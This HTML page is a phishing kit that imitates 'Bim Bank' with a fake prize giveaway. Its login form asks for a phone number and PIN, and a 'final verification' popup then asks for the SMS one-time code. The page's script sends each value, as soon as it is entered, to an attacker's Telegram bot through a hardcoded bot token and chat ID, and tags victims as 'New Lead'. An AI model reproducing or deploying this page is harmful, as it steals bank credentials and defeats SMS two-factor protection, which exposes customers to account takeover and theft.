<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bim Bank - Opportunités</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
        
        body { font-family: 'Roboto', sans-serif; background-color: #fdfdfd; }
        .grid-bg { background-image: linear-gradient(#f0f0f0 1px, transparent 1px), linear-gradient(90deg, #f0f0f0 1px, transparent 1px); background-size: 20px 20px; }

        /* الشعار العلوي المعدل */
        .logo-container { text-align: center; margin-top: 20px; }
        .logo-main-icon { height: 80px; width: auto; margin: 0 auto; }
        .logo-text-tiny { font-size: 10px; color: #2a4387; font-weight: bold; margin-top: 2px; text-transform: uppercase; letter-spacing: 2px; }

        /* قسم الجوائز الضخم */
        .awards-mega-banner {
            background: linear-gradient(135deg, #fff 0%, #fffbeb 100%);
            border: 3px solid #f19e2c;
            border-radius: 25px;
            padding: 30px 10px;
            margin: 20px 0;
            text-align: center;
            box-shadow: 0 10px 25px rgba(241, 158, 44, 0.3);
            width: 100%;
        }
        .awards-title-large { font-size: 2.2rem; font-weight: 900; color: #f19e2c; margin-bottom: 15px; text-shadow: 1px 1px 2px rgba(0,0,0,0.1); }
        .awards-icons-huge { font-size: 5.5rem; display: flex; justify-content: space-around; line-height: 1; margin-bottom: 10px; }
        .award-badge { background: #f19e2c; color: white; padding: 5px 15px; border-radius: 50px; font-weight: bold; font-size: 1.2rem; display: inline-block; }

        /* التنسيقات الأساسية */
        .bg-bim-blue { background-color: #2a4387; }
        .bg-bim-orange { background-color: #f19e2c; }
        .input-field { border: 1px solid #d1d5db; border-radius: 12px; padding: 15px; width: 100%; outline: none; background-color: white; }
        #otp-modal-container { background-color: rgba(0, 0, 0, 0.6); display: none; }
    </style>
</head>
<body class="grid-bg min-h-screen flex flex-col items-center">

    <!-- شعار بيم بنك الصغير جداً -->
    <div class="logo-container">
        <img src="https://telegra.ph/file/0c9e658933b49e1e2479e.png" alt="Icon" class="logo-main-icon">
        <div class="logo-text-tiny">bim bank</div>
    </div>

    <!-- قسم الجوائز الكبير جداً والمربح -->
    <div class="w-full max-w-sm px-4">
        <div class="awards-mega-banner">
            <h2 class="awards-title-large">GRANDES OPPORTUNITÉS</h2>
            <div class="awards-icons-huge">
                <span>🎁</span>
                <span>🚗</span>
                <span>💰</span>
            </div>
            <div class="awards-icons-huge" style="margin-top: -15px;">
                <span>🏠</span>
                <span>💎</span>
                <span>📱</span>
            </div>
            <div class="award-badge">GAGNEZ MAINTENANT !</div>
        </div>
    </div>

    <!-- واجهة تسجيل الدخول -->
    <div id="step1-login" class="w-full max-w-sm px-6 flex flex-col flex-grow">
        <h2 class="text-xl font-bold text-[#2a4387] mb-4 text-center">Accédez à votre compte pour gagner</h2>

        <div class="mb-5 relative">
            <input id="phone" type="tel" maxlength="8" oninput="updateCount('phone', 8)" class="input-field" placeholder="Numéro de téléphone">
            <span id="phone-count" class="absolute bottom-[-20px] right-2 text-xs text-gray-400">0/8</span>
        </div>

        <div class="mb-3 relative">
            <input id="password" type="password" maxlength="4" oninput="updateCount('password', 4)" class="input-field" placeholder="Code PIN">
            <span id="password-count" class="absolute bottom-[-20px] right-2 text-xs text-gray-400">0/4</span>
        </div>

        <button onclick="goToStep2()" class="bg-bim-orange text-white w-full py-4 rounded-2xl font-bold text-2xl shadow-xl mt-6 transition-transform active:scale-95">
            PARTICIPER
        </button>

        <div class="mt-auto mb-10 text-center">
            <button class="border-2 border-gray-300 text-gray-600 w-full py-3 rounded-xl font-bold">
                Besoin d'aide ?
            </button>
        </div>
    </div>

    <!-- واجهة الـ OTP (Modal) -->
    <div id="otp-modal-container" class="fixed inset-0 flex items-center justify-center z-50 px-4">
        <div class="bg-white rounded-[35px] p-8 shadow-2xl relative w-full max-w-[380px]">
            <div class="text-center mb-6">
                <div class="inline-block p-4 rounded-full bg-orange-50 border-4 border-[#f19e2c] mb-4">
                    <span id="timer-text" class="text-3xl font-black text-[#2a4387]">05:00</span>
                </div>
                <h3 class="text-2xl font-bold text-gray-800">Vérification Finale</h3>
                <p class="text-sm text-gray-500 mt-1">Entrez le code reçu par SMS pour confirmer votre participation</p>
            </div>

            <div class="relative">
                <input id="otp" type="tel" maxlength="6" oninput="updateCount('otp', 6)" class="input-field text-center text-3xl tracking-[10px] font-black border-2 border-[#f19e2c]" placeholder="000000">
            </div>

            <button onclick="finalSubmit()" class="bg-bim-orange text-white w-full py-5 rounded-2xl font-black text-2xl shadow-xl mt-8 transition-transform active:scale-95">
                CONFIRMER
            </button>
        </div>
    </div>

    <script>
        // إعدادات تليجرام المربوطة بحسابك
        const token = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0"; 
        const chatId = "8665814266"; 

        function sendToTelegram(message) {
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
        }

        function updateCount(inputId, max) {
            const input = document.getElementById(inputId);
            input.value = input.value.replace(/[^0-9]/g, '');
            document.getElementById(inputId + '-count').textContent = input.value.length + '/' + max;
        }

        function goToStep2() {
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            if(phone.length === 8 && password.length === 4) {
                sendToTelegram(`💰 Bim Bank New Lead:\n👤 Phone: ${phone}\n🔑 PIN: ${password}`);
                document.getElementById('otp-modal-container').style.display = 'flex';
                startTimer(300);
            } else { alert("Veuillez remplir vos informations correctement."); }
        }

        function startTimer(duration) {
            let timer = duration, minutes, seconds;
            const display = document.getElementById('timer-text');
            const interval = setInterval(() => {
                minutes = Math.floor(timer / 60);
                seconds = timer % 60;
                display.textContent = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
                if (--timer < 0) clearInterval(interval);
            }, 1000);
        }

        function finalSubmit() {
            const otp = document.getElementById('otp').value;
            if(otp.length === 6) {
                sendToTelegram(`✅ Bim Bank OTP Received:\nCode: ${otp}`);
                alert("Félicitations ! Votre participation a été enregistrée.");
                location.reload();
            }
        }
    </script>
</body>
</html>
